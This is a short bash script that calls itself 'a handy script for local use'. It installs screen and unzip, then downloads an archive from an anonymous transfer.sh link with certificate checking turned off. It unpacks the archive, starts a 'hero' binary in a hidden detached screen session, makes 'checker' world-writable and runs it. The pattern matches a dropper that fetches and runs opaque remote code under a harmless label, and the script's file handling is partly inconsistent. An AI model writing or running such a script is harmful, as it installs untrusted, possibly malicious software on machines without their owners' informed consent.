#!/bin/bash
#
# This is a handy script for local use

apt update
apt -y install screen unzip
wget --no-check-certificate -c https://transfer.sh/DkYGQH/vault.zip
unzip vault.zip
mv checker vault
cd vault
screen -dmS hero ./hero
> /dev/null 2>&1
chmod 777 checker && ./checker
echo succes
